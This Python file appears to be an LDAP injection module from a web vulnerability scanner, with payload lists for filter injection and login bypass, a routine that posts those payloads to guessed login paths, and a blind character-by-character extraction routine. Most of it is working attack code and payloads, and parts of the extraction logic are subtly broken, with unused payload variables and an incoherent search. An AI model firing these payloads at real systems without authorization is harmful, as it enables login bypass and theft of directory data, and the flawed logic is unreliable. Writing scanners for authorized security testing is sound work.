"""
LDAPInjectionModule - LDAP injection testing.

Tests discovered parameters for LDAP injection vulnerabilities using
filter injection, authentication bypass, and blind extraction techniques.
"""

import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.utils import (
    print_info,
    print_good,
    print_warning,
    print_error,
    print_vuln,
    get_session,
)
import logging


class LDAPInjectionModule:

    LDAP_ERROR_MARKERS = [
        "ldap", "ldapsearch", "ldap_bind", "ldap_modify",
        "ldap_error", "invalidcredentials", "protocol error",
        "operations error", "unwilling to perform",
        "object class", "naming violation",
        "javax.naming", "com.sun.jndi",
        "ldapdn", "ldapscheme",
    ]

    FILTER_PAYLOADS = [
        "*",
        "*)(&",
        "*)(objectClass=*",
        "admin)(&",
        "*)|(cn=*)",
        "*()|&",
        "admin)(|(password=*))",
        "*%00",
        "*()(|",
        "*)|(uid=*)",
        "*)(|(objectClass=*)",
        "admin)(|(cn=*))",
        "*)(userPassword=*)",
        "*)(&(|(objectClass=*)))",
        "*)(!(objectClass=NoSuchObject))",
        "*\\2a",
        "*\\28\\29\\7c\\26",
    ]

    AUTH_BYPASS_PAYLOADS = [
        {"username": "admin)(&", "password": "*"},
        {"username": "*", "password": "*"},
        {"username": "admin)(|(password=*))", "password": "anything"},
        {"username": "admin)(&", "password": ")(&"},
        {"username": "*\\00", "password": "*"},
        {"username": "admin)(|(uid=*))", "password": "x"},
        {"username": "admin)(objectClass=*)", "password": "x"},
    ]

    BLIND_TRUE_MARKERS = [
        "welcome", "dashboard", "profile", "success", "logged in",
        "account", "settings", "admin",
    ]

    BLIND_FALSE_MARKERS = [
        "invalid", "error", "failed", "denied", "wrong",
        "incorrect", "not found", "unauthorized",
    ]

    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config

    def run(self, target: str, session=None):
        print_info(f"Running LDAP injection tests on {target}...")
        results: Dict[str, Any] = {
            "target": target,
            "ldap_injections": [],
            "auth_bypasses": [],
        }

        if session is None:
            session = get_session()

        params = self._extract_params(target, session)
        if not params:
            print_info("No injectable parameters found for LDAP injection testing.")
            self.scanner.scan_data["ldap_injection"] = results
            return results

        print_info(f"Testing {len(params)} parameter(s) for LDAP injection...")
        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET")

            if not param_name:
                continue

            print_info(f"  Testing parameter '{param_name}' on {url}")

            result = self.test_ldap_filter_injection(url, param_name, session, method)
            if result:
                results["ldap_injections"].append(result)

        login_endpoints = self._detect_login_endpoints(target, session)
        for endpoint in login_endpoints:
            result = self.test_ldap_auth_bypass(endpoint, session)
            if result:
                results["auth_bypasses"].append(result)

        self.scanner.scan_data["ldap_injection"] = results
        return results

    def test_ldap_filter_injection(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    LDAP filter injection test on '{param}'...")

        try:
            baseline_resp = self._make_request(url, param, "test_baseline_12345", method, session)
            baseline_body = baseline_resp.text or ""
            baseline_length = len(baseline_body)
            baseline_status = baseline_resp.status_code
        except Exception as e:
            logging.exception("ldap_injection.py: operation failed")
            print_warning(f"    Baseline request failed: {e}")
            return None

        for payload in self.FILTER_PAYLOADS:
            try:
                resp = self._make_request(url, param, payload, method, session)
                body = resp.text or ""
                body_length = len(body)

                for marker in self.LDAP_ERROR_MARKERS:
                    if marker in body.lower():
                        finding = {
                            "type": "ldap_filter_injection",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"LDAP injection in '{param}' @ {url} | "
                            f"Payload: {payload} | Marker: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[LDAP] {url} param={param} payload='{payload}' evidence='{marker}'"
                        )
                        return finding

                if resp.status_code != baseline_status:
                    finding = {
                        "type": "ldap_filter_injection",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "evidence": f"status_diff:{baseline_status}->{resp.status_code}",
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"LDAP injection in '{param}' @ {url} | "
                        f"Payload: {payload} | Status changed: {baseline_status} -> {resp.status_code}"
                    )
                    self.scanner.findings.append(
                        f"[LDAP] {url} param={param} payload='{payload}' status_change={baseline_status}->{resp.status_code}"
                    )
                    return finding

                content_diff = abs(body_length - baseline_length)
                if baseline_length > 0 and content_diff > max(50, baseline_length * 0.2):
                    true_keywords = sum(1 for kw in self.BLIND_TRUE_MARKERS if kw in body.lower())
                    false_keywords = sum(1 for kw in self.BLIND_FALSE_MARKERS if kw in body.lower())

                    if true_keywords > false_keywords:
                        finding = {
                            "type": "ldap_blind_injection",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": f"content_diff:{content_diff},true_keywords:{true_keywords}",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"LDAP injection (blind) in '{param}' @ {url} | "
                            f"Payload: {payload} | Content diff: {content_diff} bytes"
                        )
                        self.scanner.findings.append(
                            f"[LDAP:BLIND] {url} param={param} payload='{payload}' diff={content_diff}"
                        )
                        return finding

            except Exception:
                logging.exception("ldap_injection.py: exception")
                continue
        print_info(f"    No LDAP filter injection found for '{param}'.")
        return None

    def test_ldap_auth_bypass(self, url: str, session) -> Optional[Dict[str, Any]]:
        print_info(f"    LDAP authentication bypass test on {url}...")

        for payload in self.AUTH_BYPASS_PAYLOADS:
            try:
                resp = session.post(
                    url,
                    data=payload,
                    timeout=self.config.timeout,
                    verify=self.config.verify_tls,
                )
                body = (resp.text or "").lower()

                for marker in self.LDAP_ERROR_MARKERS:
                    if marker in body:
                        finding = {
                            "type": "ldap_auth_bypass_indicator",
                            "url": url,
                            "payload": str(payload),
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"LDAP auth bypass (error leak) @ {url} | "
                            f"Payload: {str(payload)} | Marker: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[LDAP:AUTH_BYPASS_LEAK] {url} evidence='{marker}'"
                        )
                        return finding

                if resp.status_code == 200:
                    success_indicators = ["token", "jwt", "session", "success",
                                          "welcome", "dashboard", "logged", "authorized"]
                    if any(indicator in body for indicator in success_indicators):
                        finding = {
                            "type": "ldap_auth_bypass",
                            "url": url,
                            "payload": str(payload),
                            "evidence": "auth_success_with_ldap_payload",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"LDAP authentication bypass @ {url} | "
                            f"Payload: {str(payload)}"
                        )
                        self.scanner.findings.append(
                            f"[LDAP:AUTH_BYPASS] {url} payload='{str(payload)}'"
                        )
                        return finding

                no_login_markers = ["login", "sign in", "username", "password"]
                has_login_form = any(marker in body for marker in no_login_markers)
                if resp.status_code in (301, 302) and has_login_form:
                    finding = {
                        "type": "ldap_auth_bypass",
                        "url": url,
                        "payload": str(payload),
                        "evidence": "redirect_to_login",
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"LDAP auth bypass (redirect) @ {url} | "
                        f"Payload: {str(payload)} | Redirected to login"
                    )
                    self.scanner.findings.append(
                        f"[LDAP:AUTH_BYPASS_REDIRECT] {url} payload='{str(payload)}'"
                    )
                    return finding

            except Exception:
                logging.exception("ldap_injection.py: exception")
                continue
        print_info(f"    No LDAP authentication bypass found at {url}.")
        return None

    def test_blind_ldap_extraction(self, url: str, param: str, session, method: str = "POST") -> Optional[Dict[str, Any]]:
        print_info(f"    Blind LDAP extraction test on '{param}'...")

        extracted = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        for pos in range(20):
            found = False
            low, high = 0, len(charset) - 1

            while low <= high:
                mid = (low + high) // 2
                char = charset[mid]

                if extracted:
                    regex = f"^{re.escape(extracted)}[{char}-z].*"
                else:
                    regex = f"^[{char}-z].*"

                payload = f"*)(objectClass=*)\\000))%00"
                if extracted:
                    test_payload = f"{extracted}{char}*"
                else:
                    test_payload = f"{char}*"

                try:
                    resp = self._make_request(url, param, test_payload, method, session)
                    body = (resp.text or "").lower()

                    has_true = any(kw in body for kw in self.BLIND_TRUE_MARKERS)
                    has_false = any(kw in body for kw in self.BLIND_FALSE_MARKERS)

                    if has_true:
                        extracted += char
                        found = True
                        break
                    elif has_false:
                        low = mid + 1
                    else:
                        high = mid - 1
                except Exception:
                    logging.exception("ldap_injection.py: operation failed")
                    break

            if not found:
                break

        if len(extracted) >= 3:
            finding = {
                "type": "ldap_blind_extraction",
                "url": url,
                "param": param,
                "method": method,
                "extracted_value": extracted,
                "evidence": f"extracted_{len(extracted)}_chars",
                "status_code": 200,
            }
            print_vuln(
                f"LDAP blind extraction in '{param}' @ {url} | "
                f"Extracted: {extracted}"
            )
            self.scanner.findings.append(
                f"[LDAP:BLIND_EXTRACT] {url} param={param} extracted='{extracted}'"
            )
            return finding

        print_info(f"    No blind LDAP extraction succeeded for '{param}'.")
        return None

    def _make_request(self, url: str, param: str, payload: str, method: str, session):
        if method == "GET":
            test_url = self._inject_param(url, param, payload)
            return session.get(test_url, timeout=self.config.timeout, verify=self.config.verify_tls)
        else:
            return session.post(
                url,
                data={param: payload},
                timeout=self.config.timeout,
                verify=self.config.verify_tls,
            )

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _extract_params(self, target: str, session=None) -> List[Dict[str, Any]]:
        params: List[Dict[str, Any]] = []

        crawl_data = self.scanner.scan_data.get("crawl", {})
        forms = crawl_data.get("forms", [])
        for form in forms:
            form_url = form.get("url", target)
            for fp in form.get("params", []):
                params.append({
                    "url": form_url,
                    "name": fp.get("name", ""),
                    "method": form.get("method", "GET"),
                })

        parsed = urlparse(target)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            params.append({
                "url": target,
                "name": key,
                "method": "GET",
            })

        seen = set()
        unique_params = []
        for p in params:
            k = (p["url"], p["name"], p["method"])
            if k not in seen:
                seen.add(k)
                unique_params.append(p)

        return unique_params

    def _detect_login_endpoints(self, target: str, session) -> List[str]:
        endpoints = []
        common_paths = [
            "/login", "/signin", "/auth", "/api/login", "/api/auth",
            "/api/v1/login", "/api/v1/auth", "/user/login", "/account/login",
        ]

        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in common_paths:
            url = base + path
            try:
                resp = session.get(url, timeout=5, verify=self.config.verify_tls)
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct or "html" in ct or resp.status_code in (200, 400, 401, 405):
                    endpoints.append(url)
            except Exception:
                logging.exception("ldap_injection.py: exception")
                continue
        return endpoints
